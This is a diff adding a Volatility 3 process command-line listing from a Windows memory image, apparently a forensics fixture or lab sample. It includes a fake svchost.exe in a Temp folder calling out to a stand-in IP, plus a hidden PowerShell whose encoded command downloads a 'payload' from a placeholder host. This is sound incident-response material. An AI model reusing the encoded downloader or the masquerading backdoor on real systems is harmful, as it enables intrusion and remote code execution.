@@ -1,0 +1,16 @@
+Volatility 3 Framework 2.5.0
+
+PID	Process	Args
+
+4	System	Required memory at 0x8a0b6040 is not valid (process exited?)
+344	smss.exe	\SystemRoot\System32\smss.exe
+448	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+556	services.exe	C:\Windows\system32\services.exe
+564	lsass.exe	C:\Windows\system32\lsass.exe
+692	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p
+2148	explorer.exe	C:\Windows\Explorer.EXE
+3456	chrome.exe	"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=browser
+4832	svchost.exe	C:\Windows\Temp\svchost.exe -silent -connect 203.0.113.42:8443
+5120	cmd.exe	cmd.exe /c powershell -NonInteractive -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQAwAC8AcABhAHkAbABvAGEAZAA=
+5248	powershell.exe	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMQAwAC8AcABhAHkAbABvAGEAZAA=
+6004	whoami.exe	whoami
